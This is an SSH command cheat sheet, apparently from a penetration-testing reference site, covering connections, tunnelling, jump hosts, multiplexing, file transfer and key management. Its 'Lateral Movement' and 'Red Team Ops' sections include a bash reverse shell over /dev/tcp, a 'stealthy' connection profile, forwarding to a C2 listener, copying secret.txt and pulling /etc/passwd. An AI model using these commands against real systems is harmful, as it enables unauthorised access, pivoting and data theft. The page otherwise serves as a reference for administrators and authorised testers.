# SSH

> OpenSSH: secure remote login, key management, file transfer and port forwarding — local, remote and dynamic SOCKS tunnels.

- Category: Lateral Movement
- Commands: 85
- Page: https://terminal.rokibulroni.com/tool/lateral/ssh
- Homepage: https://www.openssh.com
- Documentation: https://man.openbsd.org/ssh
- Tags: remote access, tunneling, keys

## Install

- apt: `sudo apt install openssh-client`
- brew: `brew install openssh`

## Basic Remote Connection

### ssh user@192.168.1.10

```bash
ssh user@192.168.1.10
```

Establishes a basic interactive SSH session to a remote host using default settings.

### ssh -l user 192.168.1.10

```bash
ssh -l user 192.168.1.10
```

Example:

```bash
ssh -l admin 192.168.1.10
```

Connects to a remote host specifying the login username with the -l flag.


## Target Specification

### ssh user@example.com -p 2222

```bash
ssh user@example.com -p 2222
```

Connects to a remote server on a non-standard SSH port.


## Transport Options

### ssh -4 user@192.168.1.10

```bash
ssh -4 user@192.168.1.10
```

Forces the SSH client to use IPv4 addresses only.

### ssh -6 user@example.com

```bash
ssh -6 user@example.com
```

Forces the SSH client to use IPv6 addresses only.


## Authentication Handling

### ssh -o PreferredAuthentications=password user@192.168.1.10

```bash
ssh -o PreferredAuthentications=password user@192.168.1.10
```

Forces the client to attempt password authentication, ignoring keys or agents.

### ssh -o PreferredAuthentications=publickey user@192.168.1.10

```bash
ssh -o PreferredAuthentications=publickey user@192.168.1.10
```

Forces the client to use public key authentication only, failing if no key is accepted.


## Key-Based Authentication

### ssh -i ~/.ssh/id_rsa_custom user@192.168.1.10

```bash
ssh -i ~/.ssh/id_rsa_custom user@192.168.1.10
```

Example:

```bash
ssh -i ~/.ssh/deploy_key user@192.168.1.10
```

Specifies a specific identity file (private key) to use for authentication.

### ssh -i /path/to/key.pem -o IdentitiesOnly=yes user@192.168.1.10

```bash
ssh -i /path/to/key.pem -o IdentitiesOnly=yes user@192.168.1.10
```

Example:

```bash
ssh -i ./aws-key.pem -o IdentitiesOnly=yes ubuntu@192.168.1.10
```

Uses a specific key and prevents the SSH agent from offering other keys.


## Configuration Usage

### ssh -F /path/to/custom_config host_alias

```bash
ssh -F /path/to/custom_config host_alias
```

Example:

```bash
ssh -F ./project_config db_server
```

Instructs SSH to use a custom configuration file instead of the default ~/.ssh/config.


## Command Execution

### ssh user@192.168.1.10 'whoami; id; hostname'

```bash
ssh user@192.168.1.10 'whoami; id; hostname'
```

Example:

```bash
ssh user@192.168.1.10 'ls -la /var/www'
```

Executes a command string on the remote host and exits immediately after returning output.


## Session Control

### ssh -N -f user@192.168.1.10

```bash
ssh -N -f user@192.168.1.10
```

Goes into the background (-f) and executes no remote command (-N), useful for tunnel setup.

### ssh -T user@192.168.1.10

```bash
ssh -T user@192.168.1.10
```

Example:

```bash
ssh -T git@github.com
```

Disables pseudo-terminal allocation, often used for scripts or file transfers.

### ssh -t user@192.168.1.10 'top'

```bash
ssh -t user@192.168.1.10 'top'
```

Example:

```bash
ssh -t user@192.168.1.10 'sudo htop'
```

Forces pseudo-terminal allocation, allowing interactive programs like top or sudo to run.


## Output & Logging

### ssh -v user@192.168.1.10

```bash
ssh -v user@192.168.1.10
```

Enables verbose mode to print debugging messages about the connection progress.

### ssh -vvv user@192.168.1.10

```bash
ssh -vvv user@192.168.1.10
```

Enables maximum verbosity to debug complex connection, authentication, or config issues.

### ssh -q user@192.168.1.10 command

```bash
ssh -q user@192.168.1.10 command
```

Example:

```bash
ssh -q user@192.168.1.10 'uptime'
```

Enables quiet mode, suppressing most warning and diagnostic messages.

### ssh -E /tmp/ssh_log.txt -v user@192.168.1.10

```bash
ssh -E /tmp/ssh_log.txt -v user@192.168.1.10
```

Example:

```bash
ssh -E debug.log -v user@192.168.1.10
```

Appends debug logs to a specific file instead of standard error.


## Connection Optimization

### ssh -C user@192.168.1.10

```bash
ssh -C user@192.168.1.10
```

Enables compression on the connection, useful for slow links or text-heavy transfers.

### ssh -o ConnectTimeout=5 user@192.168.1.10

```bash
ssh -o ConnectTimeout=5 user@192.168.1.10
```

Sets a timeout limit in seconds for establishing the TCP connection.

### ssh -o ServerAliveInterval=60 user@192.168.1.10

```bash
ssh -o ServerAliveInterval=60 user@192.168.1.10
```

Sends a keepalive packet every 60 seconds to prevent the session from timing out.


## Port Forwarding (Local)

### ssh -L 8080:localhost:80 user@192.168.1.10

```bash
ssh -L 8080:localhost:80 user@192.168.1.10
```

Example:

```bash
ssh -L 8080:127.0.0.1:80 user@192.168.1.10
```

Forwards local port 8080 to port 80 on the remote host (Local Port Forwarding).

### ssh -L 8080:10.0.0.5:80 user@192.168.1.10

```bash
ssh -L 8080:10.0.0.5:80 user@192.168.1.10
```

Example:

```bash
ssh -L 8080:internal-db:5432 user@bastion
```

Forwards local port 8080 through the remote host to a third internal IP address.


## Port Forwarding (Remote)

### ssh -R 8080:localhost:80 user@192.168.1.10

```bash
ssh -R 8080:localhost:80 user@192.168.1.10
```

Example:

```bash
ssh -R 8080:127.0.0.1:80 user@192.168.1.10
```

Forwards port 8080 on the remote server back to port 80 on the local machine (Remote Port Forwarding).

### ssh -R 0.0.0.0:8080:localhost:80 user@192.168.1.10

```bash
ssh -R 0.0.0.0:8080:localhost:80 user@192.168.1.10
```

Example:

```bash
ssh -R 0.0.0.0:8080:127.0.0.1:80 user@public-vps
```

Exposes the reverse forwarded port 8080 on all interfaces of the remote host (requires GatewayPorts yes).


## Port Forwarding (Dynamic)

### ssh -D 9050 user@192.168.1.10

```bash
ssh -D 9050 user@192.168.1.10
```

Example:

```bash
ssh -D 9050 -N -f user@192.168.1.10
```

Creates a dynamic SOCKS proxy on local port 9050 that routes traffic through the SSH connection.


## X11 Forwarding

### ssh -X user@192.168.1.10

```bash
ssh -X user@192.168.1.10
```

Enables X11 forwarding, allowing remote GUI applications to be displayed locally.

### ssh -Y user@192.168.1.10

```bash
ssh -Y user@192.168.1.10
```

Enables trusted X11 forwarding, bypassing some X11 security checks.


## Host Key Management

### ssh -o StrictHostKeyChecking=no user@192.168.1.10

```bash
ssh -o StrictHostKeyChecking=no user@192.168.1.10
```

Automatically accepts new host keys without prompting the user.

### ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.1.10

```bash
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@192.168.1.10
```

Completely ignores known_hosts and accepts all keys, useful for ephemeral lab targets.


## Jump Hosts

### ssh -J jumpuser@jumphost user@192.168.1.20

```bash
ssh -J jumpuser@jumphost user@192.168.1.20
```

Example:

```bash
ssh -J admin@bastion.corp.com developer@internal-app
```

Uses the -J flag to transparently proxy the connection through an intermediate jump host.

### ssh -J user1@host1,user2@host2 user@target

```bash
ssh -J user1@host1,user2@host2 user@target
```

Example:

```bash
ssh -J entry@bastion1,internal@bastion2 root@deep-target
```

Chains multiple jump hosts in sequence to reach a deep internal network target.


## Proxy Command

### ssh -o ProxyCommand='ssh -W %h:%p user@jumphost' user@target

```bash
ssh -o ProxyCommand='ssh -W %h:%p user@jumphost' user@target
```

Example:

```bash
ssh -o ProxyCommand='ssh -W %h:%p jumpuser@1.2.3.4' user@10.0.0.5
```

Legacy method to proxy connections using netcat-style forwarding via an intermediate host.

### ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9050 %h %p' user@target

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9050 %h %p' user@target
```

Example:

```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:9050 %h %p' user@hidden
```

Routes the SSH connection through a local SOCKS5 proxy (e.g., Tor or another SSH tunnel).


## Agent Forwarding

### ssh -A user@192.168.1.10

```bash
ssh -A user@192.168.1.10
```

Forwards the local SSH authentication agent to the remote host, allowing subsequent hops.

### ssh -a user@192.168.1.10

```bash
ssh -a user@192.168.1.10
```

Explicitly disables agent forwarding to prevent credential theft risks on the remote host.


## Multiplexing

### ssh -M -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10

```bash
ssh -M -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10
```

Example:

```bash
ssh -M -S /tmp/mysocket user@192.168.1.10
```

Establishes a master connection socket for connection multiplexing (-M) at a specific path (-S).

### ssh -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10 command

```bash
ssh -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10 command
```

Example:

```bash
ssh -S /tmp/mysocket user@192.168.1.10 'uptime'
```

Reuses an existing master connection socket to execute commands instantly without re-authentication.

### ssh -O check -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10

```bash
ssh -O check -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10
```

Example:

```bash
ssh -O check -S /tmp/mysocket user@192.168.1.10
```

Checks the status of an active multiplexed control socket.

### ssh -O exit -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10

```bash
ssh -O exit -S /tmp/ssh_mux_%r@%h:%p user@192.168.1.10
```

Example:

```bash
ssh -O exit -S /tmp/mysocket user@192.168.1.10
```

Gracefully closes the master multiplexing connection and socket.


## Security & Encryption

### ssh -c aes256-gcm@openssh.com user@192.168.1.10

```bash
ssh -c aes256-gcm@openssh.com user@192.168.1.10
```

Forces the connection to use a specific encryption cipher.

### ssh -m hmac-sha2-512 user@192.168.1.10

```bash
ssh -m hmac-sha2-512 user@192.168.1.10
```

Forces the connection to use a specific Message Authentication Code (MAC) algorithm.

### ssh -o KexAlgorithms=curve25519-sha256 user@192.168.1.10

```bash
ssh -o KexAlgorithms=curve25519-sha256 user@192.168.1.10
```

Specifies the Key Exchange (KEX) algorithms the client will propose.

### ssh -o HostKeyAlgorithms=+ssh-rsa user@legacy-host

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa user@legacy-host
```

Example:

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa user@192.168.1.5
```

Enables legacy host key algorithms (like ssh-rsa) for connecting to outdated servers.


## File Transfer (SCP)

### scp localfile.txt user@192.168.1.10:/tmp/

```bash
scp localfile.txt user@192.168.1.10:/tmp/
```

Example:

```bash
scp exploit.py user@192.168.1.10:/tmp/
```

Securely copies a local file to a remote destination.

### scp -r folder/ user@192.168.1.10:/tmp/

```bash
scp -r folder/ user@192.168.1.10:/tmp/
```

Example:

```bash
scp -r tools/ user@192.168.1.10:/opt/
```

Recursively copies a local directory and its contents to a remote destination.

### scp -P 2222 user@192.168.1.10:/remote/file.txt .

```bash
scp -P 2222 user@192.168.1.10:/remote/file.txt .
```

Example:

```bash
scp -P 2222 user@192.168.1.10:/etc/passwd .
```

Downloads a file from a remote host listening on a non-standard port.


## File Transfer (SFTP)

### sftp user@192.168.1.10

```bash
sftp user@192.168.1.10
```

Starts an interactive Secure File Transfer Protocol session.

### sftp -b batchfile.txt user@192.168.1.10

```bash
sftp -b batchfile.txt user@192.168.1.10
```

Example:

```bash
sftp -b commands.sftp user@192.168.1.10
```

Runs SFTP in batch mode, executing commands listed in a file non-interactively.


## Advanced Configuration

### ssh -o BatchMode=yes user@192.168.1.10

```bash
ssh -o BatchMode=yes user@192.168.1.10
```

Example:

```bash
ssh -o BatchMode=yes user@192.168.1.10 'date'
```

Disables all interactive prompts (passwords, key confirmations), useful for scripts.

### ssh -o EscapeChar=none user@192.168.1.10

```bash
ssh -o EscapeChar=none user@192.168.1.10
```

Disables the escape character (default ~), allowing transparent binary data transfer.

### ssh -e ^ user@192.168.1.10

```bash
ssh -e ^ user@192.168.1.10
```

Sets the session escape character to the caret symbol (^) instead of tilde (~).


## Lateral Movement

### ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o LogLevel=ERROR user@192.168.1.10

```bash
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -o LogLevel=ERROR user@192.168.1.10
```

A stealthy connection profile that ignores host keys and suppresses warnings for red team ops.

### ssh -L 8080:127.0.0.1:80 -N user@192.168.1.10

```bash
ssh -L 8080:127.0.0.1:80 -N user@192.168.1.10
```

Establishes a background tunnel to access a remote localhost service (like an admin panel) locally.

### ssh -R 1234:127.0.0.1:4444 user@192.168.1.10

```bash
ssh -R 1234:127.0.0.1:4444 user@192.168.1.10
```

Example:

```bash
ssh -R 1234:127.0.0.1:4444 user@compromised-server
```

Remote forwards a port on the compromised server back to a local C2 listener.

### ssh -D 1080 -f -C -q -N user@192.168.1.10

```bash
ssh -D 1080 -f -C -q -N user@192.168.1.10
```

Backgrounds a compressed, quiet dynamic SOCKS proxy for pivoting tools like proxychains.

### ssh -o ProxyCommand='ssh -W %h:%p user@pivot' user@target

```bash
ssh -o ProxyCommand='ssh -W %h:%p user@pivot' user@target
```

Example:

```bash
ssh -o ProxyCommand='ssh -W %h:%p pivot-user@10.0.0.1' root@10.0.0.2
```

Manual double-hop lateral movement using ProxyCommand when -J is unavailable.

### ssh user@192.168.1.10 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'

```bash
ssh user@192.168.1.10 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'
```

Executes a reverse shell command immediately upon connection.

### ssh -o PermitLocalCommand=yes -o LocalCommand='xterm' user@192.168.1.10

```bash
ssh -o PermitLocalCommand=yes -o LocalCommand='xterm' user@192.168.1.10
```

Example:

```bash
ssh -o PermitLocalCommand=yes -o LocalCommand='scp %r@%h:secret.txt .' user@192.168.1.10
```

Executes a local command automatically after a successful connection is established.


## Tunneling & VPN

### ssh -w 0:0 user@192.168.1.10

```bash
ssh -w 0:0 user@192.168.1.10
```

Example:

```bash
ssh -w 0:0 root@192.168.1.10
```

Creates a Layer 3 TUN device tunnel (requires root on both ends and PermitTunnel yes).

### ssh -w 5:5 -o Tunnel=ethernet user@192.168.1.10

```bash
ssh -w 5:5 -o Tunnel=ethernet user@192.168.1.10
```

Example:

```bash
ssh -w 5:5 -o Tunnel=ethernet root@192.168.1.10
```

Creates a Layer 2 TAP device tunnel for bridging Ethernet segments.


## Authentication Debugging

### ssh -v -o PubkeyAuthentication=no user@192.168.1.10

```bash
ssh -v -o PubkeyAuthentication=no user@192.168.1.10
```

Debugs authentication failures by forcing a fallback to password or keyboard-interactive modes.


## Key Generation (Support)

### ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C 'comment'

```bash
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -C 'comment'
```

Example:

```bash
ssh-keygen -t ed25519 -f ~/.ssh/ops_key -C 'ops-team'
```

Generates a modern Ed25519 SSH key pair for secure authentication.


## Key Management (Support)

### ssh-keygen -R 192.168.1.10

```bash
ssh-keygen -R 192.168.1.10
```

Removes a specific host key from the known_hosts file to resolve man-in-the-middle warnings.

### ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.10

```bash
ssh-copy-id -i ~/.ssh/id_ed25519.pub user@192.168.1.10
```

Example:

```bash
ssh-copy-id -i ~/.ssh/ops_key.pub user@192.168.1.10
```

Installs a public key onto a remote server's authorized_keys file.

### ssh-keygen -y -f private_key.pem > public_key.pub

```bash
ssh-keygen -y -f private_key.pem > public_key.pub
```

Example:

```bash
ssh-keygen -y -f id_rsa > id_rsa.pub
```

Derives the public key from a private key file.

### ssh-keygen -p -f ~/.ssh/id_rsa

```bash
ssh-keygen -p -f ~/.ssh/id_rsa
```

Changes the passphrase of an existing private key without regenerating the key.


## Red Team Ops

### ssh -o ControlPath=~/.ssh/%r@%h:%p -o ControlMaster=auto -o ControlPersist=10m user@192.168.1.10

```bash
ssh -o ControlPath=~/.ssh/%r@%h:%p -o ControlMaster=auto -o ControlPersist=10m user@192.168.1.10
```

Example:

```bash
ssh -o ControlPath=/tmp/%r -o ControlMaster=auto -o ControlPersist=yes user@192.168.1.10
```

Maintains a persistent background connection socket to speed up subsequent lateral movement commands.

### ssh -o SendEnv=GIT_* user@192.168.1.10

```bash
ssh -o SendEnv=GIT_* user@192.168.1.10
```

Example:

```bash
ssh -o SendEnv=MY_VAR user@192.168.1.10
```

Passes specific local environment variables to the remote session (requires AcceptEnv on server).

### ssh -t user@192.168.1.10 'screen -R malicious_session'

```bash
ssh -t user@192.168.1.10 'screen -R malicious_session'
```

Example:

```bash
ssh -t user@192.168.1.10 'tmux attach -t session'
```

Connects and immediately attaches to a persistent terminal multiplexer session.


## Defensive Validation

### ssh -G user@192.168.1.10

```bash
ssh -G user@192.168.1.10
```

Prints the full resolved configuration for a host connection without actually connecting.

### ssh -Q cipher

```bash
ssh -Q cipher
```

Lists all encryption ciphers supported by the local SSH client.

### ssh -Q mac

```bash
ssh -Q mac
```

Lists all Message Authentication Code (MAC) algorithms supported by the client.

### ssh -Q kex

```bash
ssh -Q kex
```

Lists all Key Exchange (KEX) algorithms supported by the client.


## Certificate Authentication

### ssh -o CertificateFile=id_rsa-cert.pub user@192.168.1.10

```bash
ssh -o CertificateFile=id_rsa-cert.pub user@192.168.1.10
```

Example:

```bash
ssh -o CertificateFile=~/.ssh/id_user-cert.pub user@192.168.1.10
```

Authenticates using a signed SSH certificate instead of a raw public key.


## Agent Management

### ssh-add -l

```bash
ssh-add -l
```

Lists fingerprints of all identities currently loaded into the SSH agent.

### ssh-add -D

```bash
ssh-add -D
```

Deletes all identities from the current SSH agent.

### ssh-add -c ~/.ssh/id_rsa

```bash
ssh-add -c ~/.ssh/id_rsa
```

Example:

```bash
ssh-add -c ~/.ssh/sensitive_key
```

Adds a key to the agent with constraints, requiring confirmation for each use.

### ssh-add -t 3600 ~/.ssh/id_rsa

```bash
ssh-add -t 3600 ~/.ssh/id_rsa
```

Adds a key to the agent with a lifetime limit (e.g., 1 hour), after which it is removed.


## Legacy/Insecure

### ssh -1 user@192.168.1.10

```bash
ssh -1 user@192.168.1.10
```

Example:

```bash
ssh -1 user@old-router
```

Forces SSH protocol version 1 (highly insecure, removed in modern OpenSSH).


## Advanced Workflow

### ssh -o StreamLocalBindUnlink=yes -R /tmp/socket:/tmp/socket user@host

```bash
ssh -o StreamLocalBindUnlink=yes -R /tmp/socket:/tmp/socket user@host
```

Example:

```bash
ssh -o StreamLocalBindUnlink=yes -R /run/docker.sock:/run/docker.sock user@dev
```

Forwards a Unix domain socket from the remote host to the local machine, cleaning up stale sockets.

### ssh -t user@jump ssh -t user@target

```bash
ssh -t user@jump ssh -t user@target
```

Example:

```bash
ssh -t user@bastion ssh -t user@db-server
```

Manual chain loading of SSH sessions where -J is not supported or shell interaction is needed at each hop.

### ssh -o RemoteCommand='ls -la' user@192.168.1.10

```bash
ssh -o RemoteCommand='ls -la' user@192.168.1.10
```

Example:

```bash
ssh -o RemoteCommand='uptime' user@192.168.1.10
```

Specifies the command to execute on the remote host via the configuration option rather than argument.

### ssh -o IPQoS=throughput user@192.168.1.10

```bash
ssh -o IPQoS=throughput user@192.168.1.10
```

Optimizes the Quality of Service (QoS) flags for high-throughput bulk data transfer.

### ssh -o IPQoS=lowdelay user@192.168.1.10

```bash
ssh -o IPQoS=lowdelay user@192.168.1.10
```

Optimizes QoS flags for low-latency interactive sessions.

## Related tools

- [socat](https://terminal.rokibulroni.com/tool/utilities/socat)
- [Chisel](https://terminal.rokibulroni.com/tool/pivoting/chisel)
- [sshuttle](https://terminal.rokibulroni.com/tool/pivoting/sshuttle)
